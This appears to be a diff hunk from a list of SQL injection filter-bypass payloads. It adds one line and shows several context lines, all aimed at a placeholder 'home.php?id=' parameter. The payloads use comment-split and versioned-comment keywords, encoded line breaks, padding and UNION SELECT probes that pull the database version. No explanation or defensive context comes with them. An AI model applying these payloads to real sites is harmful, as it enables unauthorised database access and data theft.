@@ -54,3 +54,4 @@ www.site.com/home.php?id=2+and+(select 1)=(Select 0xAA[..(add about 1000 “A”
 www.site.com/home.php?id=2+uni*on+sel*ect+1,2,3,4&#8230;
 www.site.com/home.php?id=2/*!UNION*/ +/*!ALL*/+/*!SELECT*/+1,2,3,4-- -
 www.site.com/home.php?id=2 union(select(0),version(),(0),(0),(0),(0),( 0),(0),(0))
+www.site.com/home.php?id=2/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/+/*!20000%0d%0a1,2,3--*/
